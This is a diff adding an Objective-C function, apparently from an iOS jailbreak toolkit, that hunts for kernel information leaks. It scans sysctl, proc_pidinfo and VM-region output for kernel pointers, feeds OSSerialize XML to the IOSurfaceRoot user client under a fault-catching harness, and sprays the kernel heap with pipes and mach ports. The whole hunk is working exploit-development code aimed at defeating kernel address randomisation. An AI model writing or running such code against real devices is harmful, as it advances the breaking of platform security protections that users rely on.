@@ -34678,3 +34678,427 @@ void iosurface_obj_scan(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+// MARK: - JB38: Kernel Info Leak Vectors + OSSerialize
+void iosurface_kleak(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB38: === Kernel Info Leak Vectors ===");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+
+        extern void jb25_setup(void);
+        extern volatile unsigned long jb25_far;
+        extern volatile int jb25_sig;
+        extern volatile sig_atomic_t jb25_in_probe;
+        extern struct jb25_jb_holder *jb25_jb_ptr;
+        jb25_setup();
+
+        // =====================================================================
+        // FASE 1: sysctl — kern.proc info leak
+        // =====================================================================
+        log(@"JB38: === Fase 1: sysctl proc info ===");
+
+        typedef int (*sysctl_fn)(int *, unsigned int, void *, size_t *, void *, size_t);
+        sysctl_fn sysctlFn = dlsym(RTLD_DEFAULT, "sysctl");
+        typedef int (*getpid_fn)(void);
+        getpid_fn pidFn = dlsym(RTLD_DEFAULT, "getpid");
+        int myPid = pidFn ? pidFn() : 0;
+
+        if (sysctlFn) {
+            // KERN_PROC_PID — get our own proc info
+            int mib[4] = {1, 14, myPid, 0}; // CTL_KERN=1, KERN_PROC=14
+            size_t bufSize = 0;
+            int ret = sysctlFn(mib, 4, NULL, &bufSize, NULL, 0);
+            log([NSString stringWithFormat:@"JB38:   kern.proc size=%zu ret=%d", bufSize, ret]);
+
+            if (ret == 0 && bufSize > 0 && bufSize < 65536) {
+                uint8_t *buf = (uint8_t *)calloc(1, bufSize);
+                if (buf) {
+                    ret = sysctlFn(mib, 4, buf, &bufSize, NULL, 0);
+                    if (ret == 0) {
+                        uint64_t *p = (uint64_t *)buf;
+                        int leakCount = 0;
+                        for (size_t i = 0; i < bufSize / 8; i++) {
+                            if (p[i] > 0xFFFFFF8000000000ULL && p[i] < 0xFFFFFFF000000000ULL) {
+                                leakCount++;
+                                if (leakCount <= 8) {
+                                    log([NSString stringWithFormat:@"JB38:   [KPTR!] proc[%zu] = %#llx",
+                                         i * 8, p[i]]);
+                                }
+                            }
+                        }
+                        log([NSString stringWithFormat:@"JB38:   proc info: %d potential kptrs in %zu bytes",
+                             leakCount, bufSize]);
+                        results[@"procKptrs"] = @(leakCount);
+
+                        // Dump first 128 bytes as hex
+                        NSMutableString *hex = [NSMutableString string];
+                        for (size_t i = 0; i < 128 && i < bufSize; i++) {
+                            [hex appendFormat:@"%02x", buf[i]];
+                        }
+                        log([NSString stringWithFormat:@"JB38:   proc[0..127]: %@", hex]);
+                    }
+                    free(buf);
+                }
+            }
+
+            // kern.boottime — might contain info
+            int mib2[2] = {1, 21}; // CTL_KERN=1, KERN_BOOTTIME=21
+            struct { long tv_sec; long tv_usec; } boottime = {0};
+            size_t btSize = sizeof(boottime);
+            ret = sysctlFn(mib2, 2, &boottime, &btSize, NULL, 0);
+            log([NSString stringWithFormat:@"JB38:   boottime: %ld.%ld", boottime.tv_sec, boottime.tv_usec]);
+
+            // hw.memsize
+            int mib3[2] = {6, 24}; // CTL_HW=6, HW_MEMSIZE=24
+            uint64_t memsize = 0;
+            size_t msSize = sizeof(memsize);
+            ret = sysctlFn(mib3, 2, &memsize, &msSize, NULL, 0);
+            log([NSString stringWithFormat:@"JB38:   hw.memsize = %llu MB", memsize / (1024*1024)]);
+            results[@"memsize"] = @(memsize);
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 2: proc_pidinfo — task info, region info
+        // =====================================================================
+        log(@"JB38: === Fase 2: proc_pidinfo ===");
+
+        typedef int (*proc_pidinfo_fn)(int, int, uint64_t, void *, int);
+        typedef int (*proc_regionfilename_fn)(int, uint64_t, void *, uint32_t);
+        proc_pidinfo_fn pidinfo = dlsym(RTLD_DEFAULT, "proc_pidinfo");
+        proc_regionfilename_fn regionfn = dlsym(RTLD_DEFAULT, "proc_regionfilename");
+
+        log([NSString stringWithFormat:@"JB38:   proc_pidinfo = %p", pidinfo]);
+
+        if (pidinfo) {
+            // PROC_PIDTASKINFO = 4
+            uint8_t taskBuf[256] = {0};
+            int tret = pidinfo(myPid, 4, 0, taskBuf, sizeof(taskBuf));
+            log([NSString stringWithFormat:@"JB38:   PIDTASKINFO ret=%d", tret]);
+            if (tret > 0) {
+                uint64_t *tp = (uint64_t *)taskBuf;
+                for (int i = 0; i < tret / 8 && i < 16; i++) {
+                    if (tp[i] > 0xFFFFFF8000000000ULL) {
+                        log([NSString stringWithFormat:@"JB38:   [KPTR!] task[%d] = %#llx", i*8, tp[i]]);
+                    }
+                }
+                // Log virtual size, resident size
+                // struct proc_taskinfo: pti_virtual_size (off 0), pti_resident_size (off 8)
+                log([NSString stringWithFormat:@"JB38:   vsize=%llu rsize=%llu", tp[0], tp[1]]);
+                results[@"vsize"] = @(tp[0]);
+                results[@"rsize"] = @(tp[1]);
+            }
+
+            // PROC_PIDREGIONPATHINFO = 8
+            uint8_t regionBuf[2048] = {0};
+            int rret = pidinfo(myPid, 8, 0, regionBuf, sizeof(regionBuf));
+            log([NSString stringWithFormat:@"JB38:   PIDREGIONPATHINFO ret=%d", rret]);
+            if (rret > 0) {
+                uint64_t *rp = (uint64_t *)regionBuf;
+                int rkptrs = 0;
+                for (int i = 0; i < rret / 8 && i < 128; i++) {
+                    if (rp[i] > 0xFFFFFF8000000000ULL && rp[i] < 0xFFFFFFF000000000ULL) {
+                        rkptrs++;
+                        if (rkptrs <= 5) {
+                            log([NSString stringWithFormat:@"JB38:   [KPTR!] region[%d] = %#llx", i*8, rp[i]]);
+                        }
+                    }
+                }
+                results[@"regionKptrs"] = @(rkptrs);
+            }
+
+            // PROC_PIDTHREADINFO = 5
+            uint8_t thrBuf[256] = {0};
+            int thret = pidinfo(myPid, 5, 0, thrBuf, sizeof(thrBuf));
+            log([NSString stringWithFormat:@"JB38:   PIDTHREADINFO ret=%d", thret]);
+
+            // PROC_PIDLISTFDS = 1
+            uint8_t fdBuf[4096] = {0};
+            int fdret = pidinfo(myPid, 1, 0, fdBuf, sizeof(fdBuf));
+            log([NSString stringWithFormat:@"JB38:   PIDLISTFDS ret=%d (%d fds)", fdret, fdret / 8]);
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 3: vm_region_recurse_64 — VM layout + object IDs
+        // =====================================================================
+        log(@"JB38: === Fase 3: vm_region info ===");
+
+        typedef int (*mach_task_self_fn)(void);
+        mach_task_self_fn taskSelfFn = dlsym(RTLD_DEFAULT, "mach_task_self");
+        unsigned int task = taskSelfFn ? taskSelfFn() : 0;
+
+        // vm_region_recurse_64 via dlsym
+        typedef int (*vm_region_recurse_fn)(unsigned int, uint64_t *, uint64_t *,
+            uint32_t *, void *, uint32_t *);
+        vm_region_recurse_fn vmRegion = dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
+
+        log([NSString stringWithFormat:@"JB38:   mach_vm_region_recurse = %p", vmRegion]);
+
+        if (vmRegion && task) {
+            uint64_t addr = 0;
+            int regionCount = 0;
+            int interestingRegions = 0;
+
+            while (regionCount < 200) {
+                uint64_t size = 0;
+                uint32_t depth = 0;
+                // vm_region_submap_info_64 is 128 bytes
+                uint8_t info[128] = {0};
+                uint32_t infoCnt = 128 / 4; // count in 32-bit words
+
+                int kr = vmRegion(task, &addr, &size, &depth, info, &infoCnt);
+                if (kr != 0) break;
+
+                uint64_t *ip = (uint64_t *)info;
+
+                // Check for interesting values in the info struct
+                // vm_region_submap_info_64 has user_tag at offset 48 (uint32)
+                // and object_id at offset 80 (uint32)
+                uint32_t *i32 = (uint32_t *)info;
+                uint32_t userTag = i32[12]; // offset 48
+                uint32_t objectId = i32[20]; // offset 80
+
+                // Check all 64-bit fields for kernel pointers
+                for (int j = 0; j < 16; j++) {
+                    if (ip[j] > 0xFFFFFF8000000000ULL && ip[j] < 0xFFFFFFF000000000ULL) {
+                        if (interestingRegions < 5) {
+                            log([NSString stringWithFormat:@"JB38:   [KPTR!] vm_region %#llx+%#llx info[%d]=%#llx tag=%u",
+                                 addr, size, j*8, ip[j], userTag]);
+                        }
+                        interestingRegions++;
+                    }
+                }
+
+                // Log IOSurface-related regions (tag 7 = IOKit)
+                if (userTag == 7 && regionCount < 100) {
+                    log([NSString stringWithFormat:@"JB38:   IOKit region: %#llx size=%#llx objId=%u",
+                         addr, size, objectId]);
+                }
+
+                addr += size;
+                regionCount++;
+            }
+
+            log([NSString stringWithFormat:@"JB38:   Scanned %d regions, %d with potential kptrs",
+                 regionCount, interestingRegions]);
+            results[@"vmRegions"] = @(regionCount);
+            results[@"vmKptrs"] = @(interestingRegions);
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 4: OSSerialize XML format for IOConnectCallMethod
+        // =====================================================================
+        log(@"JB38: === Fase 4: OSSerialize format ===");
+
+        typedef void *(*IOServiceMatching_fn)(const char *);
+        typedef unsigned int (*IOServiceGetMatchingService_fn)(unsigned int, void *);
+        typedef int (*IOServiceOpen_fn)(unsigned int, unsigned int, unsigned int, unsigned int *);
+        typedef int (*IOConnectCallMethod_fn)(unsigned int, uint32_t,
+            const uint64_t *, uint32_t, const void *, size_t,
+            uint64_t *, uint32_t *, void *, size_t *);
+
+        IOServiceMatching_fn matchFn = dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        IOServiceGetMatchingService_fn getSvcFn = dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        IOServiceOpen_fn openFn = dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        IOConnectCallMethod_fn callMethodFn = dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+
+        unsigned int connect = 0;
+        if (matchFn && getSvcFn && openFn) {
+            void *matching = matchFn("IOSurfaceRoot");
+            unsigned int service = matching ? getSvcFn(0, matching) : 0;
+            if (service) openFn(service, task, 0, &connect);
+        }
+
+        if (connect && callMethodFn) {
+            // IOKit OSSerialize XML format (not NSPropertyList)
+            // This is the format XNU's IOUserClient expects
+            const char *osXml =
+                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+                "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
+                "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
+                "<plist version=\"1.0\">"
+                "<dict>"
+                "<key>IOSurfaceWidth</key><integer size=\"32\">0x20</integer>"
+                "<key>IOSurfaceHeight</key><integer size=\"32\">0x20</integer>"
+                "<key>IOSurfaceBytesPerElement</key><integer size=\"32\">0x4</integer>"
+                "<key>IOSurfacePixelFormat</key><integer size=\"32\">0x42475241</integer>"
+                "<key>IOSurfaceAllocSize</key><integer size=\"32\">0x1000</integer>"
+                "</dict>"
+                "</plist>";
+            size_t osXmlLen = strlen(osXml);
+            log([NSString stringWithFormat:@"JB38:   OSSerialize XML: %zu bytes", osXmlLen]);
+
+            uint8_t outBuf[4096] = {0};
+            size_t outSize = sizeof(outBuf);
+
+            jb25_far = 0; jb25_sig = 0;
+            int ret0 = -999;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                ret0 = callMethodFn(connect, 0, NULL, 0,
+                    osXml, osXmlLen, NULL, NULL, outBuf, &outSize);
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB38:   sel0(osxml) FAULT sig=%d", jb25_sig]);
+            }
+
+            log([NSString stringWithFormat:@"JB38:   sel0(osxml) = %d (%#x) outSize=%zu",
+                 ret0, (unsigned)ret0, outSize]);
+            results[@"sel0_osxml"] = @(ret0);
+
+            if (ret0 == 0 && outSize > 0) {
+                log(@"JB38:   [+] OSSerialize XML WORKS for sel0!");
+                // Parse output
+                NSData *outData = [NSData dataWithBytes:outBuf length:outSize];
+                NSString *outStr = [[NSString alloc] initWithData:outData encoding:NSUTF8StringEncoding];
+                if (outStr) {
+                    log([NSString stringWithFormat:@"JB38:   Output XML: %@",
+                         [outStr substringToIndex:MIN(200, [outStr length])]]);
+                } else {
+                    NSMutableString *hex = [NSMutableString string];
+                    for (size_t i = 0; i < outSize && i < 64; i++) {
+                        [hex appendFormat:@"%02x", outBuf[i]];
+                    }
+                    log([NSString stringWithFormat:@"JB38:   Output raw: %@", hex]);
+                }
+            }
+
+            // Also try IOKit-style compact XML (no plist wrapper)
+            const char *compactXml =
+                "<dict>"
+                "<key>IOSurfaceWidth</key><integer>32</integer>"
+                "<key>IOSurfaceHeight</key><integer>32</integer>"
+                "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
+                "<key>IOSurfaceAllocSize</key><integer>4096</integer>"
+                "</dict>";
+            size_t compactLen = strlen(compactXml);
+
+            outSize = sizeof(outBuf);
+            memset(outBuf, 0, sizeof(outBuf));
+
+            jb25_far = 0; jb25_sig = 0;
+            int ret0c = -999;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                ret0c = callMethodFn(connect, 0, NULL, 0,
+                    compactXml, compactLen, NULL, NULL, outBuf, &outSize);
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB38:   sel0(compact) FAULT sig=%d", jb25_sig]);
+            }
+
+            log([NSString stringWithFormat:@"JB38:   sel0(compact) = %d (%#x) outSize=%zu",
+                 ret0c, (unsigned)ret0c, outSize]);
+            results[@"sel0_compact"] = @(ret0c);
+
+            if (ret0c == 0 && outSize > 0) {
+                log(@"JB38:   [+] Compact XML WORKS!");
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 5: Pipe buffer spray + mach port names
+        // =====================================================================
+        log(@"JB38: === Fase 5: Pipe + mach port spray ===");
+
+        // Create pipes to spray kernel heap
+        int pipeFds[16][2];
+        int pipeCount = 0;
+        for (int i = 0; i < 16; i++) {
+            if (pipe(pipeFds[i]) == 0) {
+                pipeCount++;
+                // Fill pipe with marker data
+                uint64_t marker = 0xDEAD38000000ULL | i;
+                write(pipeFds[i][1], &marker, 8);
+            }
+        }
+        log([NSString stringWithFormat:@"JB38:   Created %d pipes", pipeCount]);
+
+        // Allocate mach ports
+        typedef int (*mach_port_allocate_fn)(unsigned int, int, unsigned int *);
+        mach_port_allocate_fn portAlloc = dlsym(RTLD_DEFAULT, "mach_port_allocate");
+        typedef int (*mach_port_deallocate_fn)(unsigned int, unsigned int);
+        mach_port_deallocate_fn portDealloc = dlsym(RTLD_DEFAULT, "mach_port_deallocate");
+
+        unsigned int ports[64];
+        int portCount = 0;
+        if (portAlloc && task) {
+            for (int i = 0; i < 64; i++) {
+                // MACH_PORT_RIGHT_RECEIVE = 1
+                int kr = portAlloc(task, 1, &ports[i]);
+                if (kr == 0) portCount++;
+                else break;
+            }
+        }
+        log([NSString stringWithFormat:@"JB38:   Allocated %d mach ports", portCount]);
+
+        if (portCount > 1) {
+            log([NSString stringWithFormat:@"JB38:   Port range: %u - %u (delta=%u)",
+                 ports[0], ports[portCount-1], ports[portCount-1] - ports[0]]);
+            results[@"portFirst"] = @(ports[0]);
+            results[@"portLast"] = @(ports[portCount-1]);
+
+            // Port names encode index — check pattern
+            int sequential = 1;
+            uint32_t delta = ports[1] - ports[0];
+            for (int i = 2; i < portCount; i++) {
+                if (ports[i] - ports[i-1] != delta) { sequential = 0; break; }
+            }
+            log([NSString stringWithFormat:@"JB38:   Port delta=%u sequential=%s", delta,
+                 sequential ? "YES" : "NO"]);
+            results[@"portDelta"] = @(delta);
+        }
+
+        // Cleanup
+        for (int i = 0; i < pipeCount; i++) {
+            close(pipeFds[i][0]);
+            close(pipeFds[i][1]);
+        }
+        if (portDealloc) {
+            for (int i = 0; i < portCount; i++) {
+                portDealloc(task, ports[i]);
+            }
+        }
+
+        // =====================================================================
+        // VERDICT
+        // =====================================================================
+        log(@"JB38: =============================================");
+
+        int procKptrs = [results[@"procKptrs"] intValue];
+        int regionKptrs = [results[@"regionKptrs"] intValue];
+        int vmKptrs = [results[@"vmKptrs"] intValue];
+        BOOL osxmlWorks = ([results[@"sel0_osxml"] intValue] == 0 ||
+                           [results[@"sel0_compact"] intValue] == 0);
+
+        NSString *verdict;
+        if (procKptrs > 0 || regionKptrs > 0 || vmKptrs > 0) {
+            verdict = @"KERNEL_LEAK_FOUND";
+            log([NSString stringWithFormat:@"JB38: [!!!!!] Kernel ptrs leaked! proc=%d region=%d vm=%d",
+                 procKptrs, regionKptrs, vmKptrs]);
+        } else if (osxmlWorks) {
+            verdict = @"OSSERIALIZE_WORKS";
+            log(@"JB38: [!!!] OSSerialize XML accepted by IOSurface!");
+        } else {
+            verdict = @"NO_LEAK";
+            log(@"JB38: No kernel pointer leaks found via tested vectors");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB38: Verdict: %@", verdict]);
+        log(@"JB38: =============================================");
+
+        isr_checkpoint(@"JB38-kleak-checkpoint.json", results);
+        done(results);
+    });
+}
